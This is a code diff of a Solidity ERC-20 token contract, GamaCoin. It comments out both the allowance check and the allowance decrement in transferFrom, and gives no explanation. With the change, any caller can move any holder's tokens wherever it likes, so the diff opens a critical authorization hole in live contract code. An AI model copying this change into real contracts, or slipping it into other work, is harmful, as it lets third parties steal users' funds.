@@ -92,12 +92,12 @@ contract GamaCoin is IERC20 {
     function transferFrom(address _from, address _to, uint256 _value) external override returns (bool){
         require(status == Status.ACTIVE, "The contract is not active.");
         require(_value <= addressToBalance[_from]);
-        require(_value <= allowances[_from][msg.sender]);
+        //require(_value <= allowances[_from][msg.sender]);
 
         addressToBalance[_from] -= _value;
         addressToBalance[_to] += _value;
 
-        allowances[_from][msg.sender] -= _value;
+        //allowances[_from][msg.sender] -= _value;
 
         emit Transfer(_from, _to, _value);
 
